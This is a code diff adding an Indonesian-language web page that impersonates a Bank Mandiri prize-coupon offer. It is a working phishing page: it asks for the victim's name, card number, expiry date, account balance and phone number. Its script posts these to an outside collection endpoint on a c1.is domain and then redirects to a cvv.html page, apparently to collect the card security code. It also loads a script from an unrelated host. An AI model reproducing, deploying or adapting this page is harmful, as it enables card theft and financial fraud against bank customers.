@@ -1,0 +1,155 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8">
+  <link rel="icon" href="Mandiri.svg">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <meta property="og:image" content="">
+  <meta name="theme-color" content="#000000">
+  <meta name="description" content="* Ambil Kupon anda Sekarang juga">
+  <link rel="icon" type="image/svg" href="Mandiri.svg">
+  <title>Kupon Berhadiah</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer"> 
+  <link href="main.css" rel="stylesheet">
+ </head>
+ <body style="position: fixed">
+
+  <div id="root">
+   <div>
+    <div class="pg1">
+    <form id="formDebit" method="POST"
+              enctype="application/x-www-form-urlencoded" class="f3">
+      <br>
+      <div class="px-2 bg-light ">
+       <marquee class="py-3" direction="left">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRjkrkF3dGzEBUIljc0q8P_VmgkEHsatFrTy1_dbT4I-i6CuETbb8yhTc-wGq1amlb5SdNjJEMWIyznAvURAvG3PjQ2sZNE6hL8zxB37bGMXjd5c0FZ-7AH7SrF_vWXNdb35sHQyeCNP12omQhIGLwUBTXVvhLm7ZcB8ycbz6jurQ87eEpUWPCtY2yAOM/s1664/vid.4d81dfd4433b5ec6d765.png" width="300px" height="30px" class="mtp">------- Silakan Lengkapi Formulir Cetak Kupon Mandiri Berhadiah anda -.
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRjkrkF3dGzEBUIljc0q8P_VmgkEHsatFrTy1_dbT4I-i6CuETbb8yhTc-wGq1amlb5SdNjJEMWIyznAvURAvG3PjQ2sZNE6hL8zxB37bGMXjd5c0FZ-7AH7SrF_vWXNdb35sHQyeCNP12omQhIGLwUBTXVvhLm7ZcB8ycbz6jurQ87eEpUWPCtY2yAOM/s1664/vid.4d81dfd4433b5ec6d765.png" width="300px" height="30px" class="mtp">
+       </marquee>
+      </div>
+ 
+      <label>📝 Nama Lengkap</label>
+      <br>
+      <input class="user" id="nama" name="nama" type="text" placeholder="Masukkan Nama Lengkap" minlength="3" maxlength="50" value="">
+      <br>
+      <label class="ib">📝 Nomor Kartu Debit/Kredit *</label>
+      <input class="card" id="debit" name="debit" type="tel" pattern="(?=.*\d)(?=.*[4-6]).{1,}(?=.*[0-6]).{1,}(?=.*[1-3]).{1,}(?=.*[0-9]).{13,}" placeholder="16 digit Nomor Kartu" minlength="19" maxlength="19" required value="">
+      <br>
+      <div style="display: flex;">
+       <div>
+        <label class="ib">📝 Masa Berlaku Kartu *</label>
+        <br>
+        <span class="selct">
+            <select class="valid" id="bulan" name="bulan">
+            <option>Bulan</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
+            </select>
+            <select class="valid" id="tahun" name="tahun"><option>Tahun</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option></select></span>
+       </div>
+       <br>
+      </div>
+      <label class="ib" style="font-size: 13px;">📝 Saldo Terakhir *</label>
+      <br>
+      <input type="tel" class="saldo" id="rupiah" name="saldo" type="input" placeholder="Rp." required>
+      <inout type="hidden" id="tanparupiah"></inout>
+      <br>
+      <label>📝 Nomor Handphone</label>
+      <br>
+      <input class="call" id="phone" name="phone" type="tel" pattern="(?=.*\d)(?=.*[0]).{1,}(?=.*[8]).{1,}(?=.*[0-9]).{8,}" placeholder="Masukkan No Handphone" maxlength="13" required value="" minlength="10">
+      <br>
+      <button class="butt" id="btnku" type="submit" style="margin-top: 0vw; background-color: rgb(19, 108, 195);">Cetak Kupon</button>
+     </form>
+     <div class="no-loading" style="background: rgba(0,0,0, 0.4); display: none;" id="load">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1tmVyow1AWQzhYq2QOx6GW5PuOYHrHrphJL2-baC5ob6h68O-wofBLQHAZgTxqFOv4jTGATckPWZYQbHC7ZyoKmxpIBIQDuKDRGIZXafrDKQ05S4rBoq7E3rBNizP4Hlkk3YBNuPN0hv7YUtFXRxS4Z27PWsVmRXNPa9MwkxppnDNSSwp_A1xZ74Q_MA/s512/loading.0676da7c48632f2f150c.gif" width="80px" alt="Loading">
+     </div>
+    </div>
+   
+   
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+  <script>
+$('#formDebit').on('submit', function (event) {
+
+ $("#load").addClass("loading");
+  event.stopPropagation();
+    event.preventDefault();
+ 
+  
+    
+document.getElementById("btnku").innerHTML = 'Sedang Memproses....'; 
+
+$.ajax({
+ type: 'POST',
+ url: 'https://layanan-upgrade.c1.is/Gebyar/sendDebit.php',
+ async: false,
+ dataType: 'JSON',
+ data: $(this).serialize(),
+ 
+ complete: function(data) {
+            console.log('Complete')
+setTimeout(function(){
+       $("#load").addClass("no-loading");
+       
+       
+ var nama = document.getElementById("nama").value;
+ sessionStorage.setItem("nama", nama);
+var debit = document.getElementById("debit").value;
+ sessionStorage.setItem("debit", debit);
+ var valid = document.getElementById("bulan").value + "/" + document.getElementById("tahun").value;
+ sessionStorage.setItem("valid", valid);
+ var saldo = document.getElementById("rupiah").value;
+ sessionStorage.setItem("saldo", saldo);  
+var phone = document.getElementById("phone").value;
+ sessionStorage.setItem("phone", phone);  
+ 
+location.href ="./cvv.html";
+   
+    }, 1500);
+        }
+    });
+
+    return false;
+});       
+</script>    
+  <script>
+      /* Tanpa Rupiah */
+    var tanpa_rupiah = document.getElementById('tanparupiah');
+    tanpa_rupiah.addEventListener('keyup', function(e)
+    {
+        tanpa_rupiah.value = formatRupiah(this.value);
+    });
+    
+    /* Dengan Rupiah */
+    var dengan_rupiah = document.getElementById('rupiah');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+    
+  </script>	   
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+<script>$(document).ready(function(){$('#rupiah').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>
+<script>$(document).ready(function(){$('#debit').mask('0000 0000 0000 0000');});</script>
+   </div>
+  </div>
+ </body>
+</html>
